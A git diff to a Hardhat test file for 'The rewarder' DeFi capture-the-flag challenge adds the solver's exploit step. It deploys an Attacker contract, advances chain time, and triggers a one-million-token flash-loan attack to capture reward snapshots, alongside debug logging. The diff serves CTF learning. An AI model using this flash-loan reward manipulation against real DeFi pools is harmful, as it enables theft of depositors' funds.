@@ -40,6 +40,9 @@ describe('[Challenge] The rewarder', function () {
                 await this.accountingToken.balanceOf(users[i].address)
             ).to.be.eq(amount);
         }
+
+
+
         expect(await this.accountingToken.totalSupply()).to.be.eq(ethers.utils.parseEther('400'));
         expect(await this.rewardToken.totalSupply()).to.be.eq('0');
 
@@ -62,11 +65,53 @@ describe('[Challenge] The rewarder', function () {
         expect(
             await this.rewarderPool.roundNumber()
         ).to.be.eq('2');
+        // lastSnapshotIdForRewards;
+        // uint256 public lastRecordedSnapshotTimestamp;
+        const res = await this.rewarderPool.lastSnapshotIdForRewards();
+        console.log("TEST LAST SNAPSHOT: " ,res.toNumber())
     });
+
+
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+ // Advance time 5 days so that depositors can get rewards
+
+ const Attacker = await ethers.getContractFactory('Attacker', attacker);
+
+ // (address liquidityTokenAddress
+ // ,address _flashLoanPool
+ // ,address _rewardPool
+ // ,address _rewardToken
+ console.log("ATTACKER: " , attacker.address)
+
+ this.attackercontract = await Attacker.deploy(
+     this.liquidityToken.address,this.flashLoanPool.address,this.rewarderPool.address,this.rewardToken.address,attacker.address
+ );
+ await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+ await this.attackercontract.attack(ethers.utils.parseEther('1000000'))
+
+
+ await this.rewarderPool.distributeRewards()
+
+ //**** ohh so after the evm time has been increased like this, will need to trigger the snapshot by depositing or calling distribute rewards.
+ //that will at least push the roundnumber up */
+ const res = await this.rewarderPool.lastSnapshotIdForRewards();
+ console.log("TEST LAST SNAPSHOT2: " ,res.toNumber())
+
+ let rewards = await this.rewardToken.balanceOf(this.attackercontract.address);
+ console.log("rewards: " , ethers.utils.formatEther(rewards))
+
+ //await this.token.approve(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+ //await this.token.connect().transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+ 
+ //this.rewardToken.connect(this.attackercontract.address).transfer(attacker,ethers.utils.parseEther('1000000'))
+
     });
+
+
 
     after(async function () {
         /** SUCCESS CONDITIONS */
@@ -80,7 +125,7 @@ describe('[Challenge] The rewarder', function () {
         for (let i = 0; i < users.length; i++) {
             await this.rewarderPool.connect(users[i]).distributeRewards();
             let rewards = await this.rewardToken.balanceOf(users[i].address);
-            
+                console.log("other user rewards: ", ethers.utils.formatEther(rewards))
             // The difference between current and previous rewards balance should be lower than 0.01 tokens
             let delta = rewards.sub(ethers.utils.parseEther('25'));
             expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
